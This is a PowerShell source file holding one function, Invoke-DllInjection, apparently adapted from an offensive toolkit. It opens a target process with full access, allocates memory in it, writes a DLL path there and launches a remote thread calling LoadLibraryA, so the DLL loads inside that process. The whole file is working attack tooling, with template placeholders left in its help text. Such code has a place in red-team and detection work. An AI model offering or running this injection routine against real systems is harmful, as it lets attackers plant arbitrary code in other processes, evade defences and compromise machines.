function Invoke-DllInjection {
    <#
    .SYNOPSIS
        Performs dll Injection
    .DESCRIPTION
        "DLL Injection" is a technique used to make a running process (executable) load a DLL without requiring a restart.
    .NOTES
        Information or caveats about the function e.g. 'This function is not supported in Linux'
    .LINK
        Specify a URI to a help page, this will show when Get-Help -Online is used.
    .EXAMPLE
        Invoke-DllInjection win32spl.dll $PID
        Explanation of the function or its result. You can include multiple examples with additional .EXAMPLE lines
    #>
    [CmdletBinding()]
    [OutPutType([System.Diagnostics.ProcessModule])]
    param (
        # FullPath to dll
        [Parameter(Mandatory = $true, Position = 0)]
        [ValidateNotNullOrEmpty()]
        [string]$dllPath,
        # PID
        [Parameter(Mandatory = $true, Position = 1)]
        [ValidateNotNullOrEmpty()]
        [Int]$ProcessID
    )

    process {
        $AsciiEncoder = New-Object System.Text.ASCIIEncoding
        # Save the name of the dll in an ascii-encoded format. This name will be injected into the remote process.
        $DllByteArray = $AsciiEncoder.GetBytes($dllPath)
        # Get addresses of and declare delegates for essential Win32 functions.
        $OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
        $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
        $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
        $VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
        $VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [Uint32], [UInt32], [UInt32]) ([IntPtr])
        $VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
        $VirtualFreeExAddr = Get-ProcAddress kernel32.dll VirtualFreeEx
        $VirtualFreeExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [Uint32], [UInt32]) ([Bool])
        $VirtualFreeEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeExAddr, $VirtualFreeExDelegate)
        $WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
        $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [Byte[]], [UInt32], [UInt32].MakeByRefType()) ([Bool])
        $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
        $RtlCreateUserThreadAddr = Get-ProcAddress ntdll.dll RtlCreateUserThread
        $RtlCreateUserThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [Bool], [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([UInt32])
        $RtlCreateUserThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($RtlCreateUserThreadAddr, $RtlCreateUserThreadDelegate)
        $CloseHandleAddr = Get-ProcAddress kernel32.dll CloseHandle
        $CloseHandleDelegate = Get-DelegateType @([IntPtr]) ([Bool])
        $CloseHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CloseHandleAddr, $CloseHandleDelegate)

        # Determine the bitness of the running PowerShell process based upon the size of the IntPtr type.
        $PowerShell32bit = [IntPtr]::Size -eq 4
        $64bitOS = [bool]${Env:ProgramFiles(x86)}
        # The address for IsWow64Process will be returned if and only if running on a 64-bit CPU. Otherwise, Get-ProcAddress will return $null.
        $IsWow64ProcessAddr = Get-ProcAddress kernel32.dll IsWow64Process

        if ($IsWow64ProcessAddr) {
            $IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
            $IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
        }
        $Architecture = Get-PEArchitecture $dllPath
        Write-Verbose "Architecture of the dll to be injected: $Architecture"

        # Open a handle to the process you want to inject into
        $hProcess = $OpenProcess.Invoke(0x001F0FFF, $false, $ProcessID) # ProcessAccessFlags.All (0x001F0FFF)

        if (!$hProcess) {
            Throw 'Unable to open process handle.'
        }

        # Only perform theses checks if OS is 64-bit
        if ($64bitOS) {
            if ( ($Architecture -ne 'X86') -and ($Architecture -ne 'X64') ) {
                Throw 'Only x86 or AMD64 architechtures supported.'
            }

            # Determine is the process specified is 32 or 64 bit. Assume that it is 64-bit unless determined otherwise.
            $IsWow64 = $False
            $IsWow64Process.Invoke($hProcess, [Ref] $IsWow64) | Out-Null

            if ( $PowerShell32bit -and ($Architecture -eq 'X64') ) {
                Throw 'You cannot manipulate 64-bit code within 32-bit PowerShell. Open the 64-bit version and try again.'
            }

            if ( (!$IsWow64) -and ($Architecture -eq 'X86') ) {
                Throw 'You cannot inject a 32-bit DLL into a 64-bit process.'
            }

            if ( $IsWow64 -and ($Architecture -eq 'X64') ) {
                Throw 'You cannot inject a 64-bit DLL into a 32-bit process.'
            }
        } else {
            if ($Architecture -ne 'X86') {
                Throw 'PE file was not compiled for x86.'
            }
        }

        # Get address of LoadLibraryA function
        $LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
        Write-Verbose "LoadLibrary address: 0x$($LoadLibraryAddr.ToString("X$([IntPtr]::Size*2)"))"

        # Reserve and commit memory to hold name of dll
        $RemoteMemAddr = $VirtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, $dllPath.Length, 0x3000, 4) # (0x3000 = Reserve|Commit, 4 = RW)
        if ($RemoteMemAddr -eq [IntPtr]::Zero) {
            Throw 'Unable to allocate memory in remote process. Try running PowerShell elevated.'
        }
        Write-Verbose "DLL path memory reserved at 0x$($RemoteMemAddr.ToString("X$([IntPtr]::Size*2)"))"

        # Write the name of the dll to the remote process address space
        $WriteProcessMemory.Invoke($hProcess, $RemoteMemAddr, $DllByteArray, $dllPath.Length, [Ref] 0) | Out-Null
        Write-Verbose "Dll path written sucessfully."

        # Execute dll as a remote thread
        $Result = $RtlCreateUserThread.Invoke($hProcess, [IntPtr]::Zero, $False, 0, [IntPtr]::Zero, [IntPtr]::Zero, $LoadLibraryAddr, $RemoteMemAddr, [IntPtr]::Zero, [IntPtr]::Zero)
        if ($Result) {
            Throw "Unable to launch remote thread. NTSTATUS: 0x$($Result.ToString('X8'))"
        }

        $VirtualFreeEx.Invoke($hProcess, $RemoteMemAddr, $dllPath.Length, 0x8000) | Out-Null # MEM_RELEASE (0x8000)

        # Close process handle
        $CloseHandle.Invoke($hProcess) | Out-Null
        Start-Sleep -Seconds 2
        # Extract just the filename from the provided path to the dll.
        [System.String]$FileName = (Split-Path $dllPath -Leaf).ToLower();
        [System.Diagnostics.ProcessModule]$DllInfo = (Get-Process -Id $ProcessID).Modules | Where-Object { $_.FileName.ToLower().Contains($FileName) };
    }

    end {
        if (!$DllInfo) {
            Throw "Dll did dot inject properly into the target Process."
        } else {
            Write-Verbose 'Dll injection complete!'
            return $DllInfo
        }
    }
}